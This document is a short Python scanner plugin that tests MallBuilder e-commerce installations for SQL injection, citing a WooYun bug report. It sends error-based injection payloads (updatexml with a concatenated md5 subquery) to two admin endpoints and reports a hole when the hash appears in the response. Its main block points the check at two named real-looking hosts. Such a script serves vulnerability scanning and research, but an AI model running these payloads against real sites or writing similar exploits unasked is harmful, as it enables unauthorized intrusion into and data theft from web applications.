#/usr/bin/python
#-*- coding: utf-8 -*-
# Refer http://www.wooyun.org/bugs/wooyun-2015-097475
#__Author__ = 上善若水
#_PlugName_ = mall-builder_sql Plugin
#_FileName_ = mall-builder_sql.py


def assign(service, arg):
    if service == "mallbuilder":
        return True, arg


def audit(arg):
    payloads = ('?m=message&s=admin_message_list_delbox&rid=1',
                '?m=activity&s=admin_activity_product_list')
    for payload in payloads:
        url = arg + payload
        post_datas = ("deid[0]=1/**/or/**/1=updatexml(1,concat(0x5c,(select/**/md5(123)/**/limit/**/1)),1)&recover=1#",
                      "act=add&chk[]=1/**/or/**/1=updatexml(1,concat(0x23,(select/**/md5(123)/**/limit/**/1)),1)#")
        for post_data in post_datas:
            code, head, body, errcode, _url = curl.curl(
                ' "%s" -d "%s" ' % (url, post_data))
            if code == 200 and '202cb962ac59075b964b07152d234b7' in body:
                security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('mallbuilder', 'http://democn.mall-builder.com/')[1])
    audit(assign('mallbuilder', 'http://www.021517.com/')[1])